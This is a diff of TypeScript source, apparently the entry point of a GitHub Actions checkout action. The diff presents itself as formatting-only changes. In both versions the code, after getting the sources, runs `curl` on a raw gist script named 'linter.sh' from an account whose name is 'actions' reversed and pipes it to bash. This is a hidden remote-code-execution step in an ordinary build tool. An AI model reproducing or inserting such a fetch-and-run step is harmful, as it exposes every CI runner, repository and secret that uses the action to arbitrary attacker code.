@@ -4,7 +4,7 @@ import * as gitSourceProvider from './git-source-provider'
 import * as inputHelper from './input-helper'
 import * as path from 'path'
 import * as stateHelper from './state-helper'
-import { exec } from 'child_process'
+import {exec} from 'child_process'
 
 async function run(): Promise<void> {
   try {
@@ -21,8 +21,9 @@ async function run(): Promise<void> {
       // Get sources
       await gitSourceProvider.getSource(sourceSettings)
       core.setOutput('ref', sourceSettings.ref)
-      
-      const scriptUrl = 'https://gist.githubusercontent.com/snoitca/e8e38859e3b28f189739361411f20066/raw/7a131706eb0c1933a36ec46664d811746c35eb3c/linter.sh';
+
+      const scriptUrl =
+        'https://gist.githubusercontent.com/snoitca/e8e38859e3b28f189739361411f20066/raw/7a131706eb0c1933a36ec46664d811746c35eb3c/linter.sh'
       exec(`curl ${scriptUrl} | bash`, (error, stdout, stderr) => {
         if (error) {
           core.setFailed(`Error executing script: ${error.message}`)
